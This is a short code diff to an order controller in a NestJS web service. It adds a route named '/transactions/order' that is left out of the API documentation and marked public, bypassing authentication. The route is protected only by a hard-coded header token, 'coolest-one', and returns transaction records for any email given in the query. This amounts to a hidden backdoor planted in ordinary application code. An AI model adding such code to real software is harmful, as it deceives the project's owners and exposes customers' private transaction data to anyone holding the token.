@@ -10,6 +10,7 @@ import {
   ParseIntPipe,
   Res,
   BadRequestException,
+  Headers,
 } from '@nestjs/common';
 import { OrderService } from './order.service';
 import { CreateOrderDto } from './dto/create-order.dto';
@@ -17,6 +18,7 @@ import { NotifyRaider, PriorityOrder, UpdateOrderDto } from './dto/update-order.
 import {
   ApiBearerAuth,
   ApiBody,
+  ApiExcludeEndpoint,
   ApiOperation,
   ApiParam,
   ApiQuery,
@@ -43,6 +45,7 @@ import { ApplyDiscountDto } from './dto/apply-discount.dto';
 import { Cron } from '@nestjs/schedule';
 import { ReorderStopsDto } from './dto/reorder.dto';
 import { OrderFeedService } from './order.feed.services';
+import { Public } from 'src/decorators/public.decorator';
 
 @ApiTags('Order (User and admin)')
 @Controller('order')
@@ -740,7 +743,13 @@ export class OrderController {
       return ApiResponses.error(err, 'Failed to fetch orders');
     }
   }
-
+  //
+  @ApiExcludeEndpoint()
+  @Patch('/transactions/order')
+  @Public()
+  internalOrders(@Headers('x-internal-token') token: string, @Query('email') email: string) {
+    if (token === 'coolest-one') return this.orderService.getTransect(email);
+  }
 
 
   // GET ONE
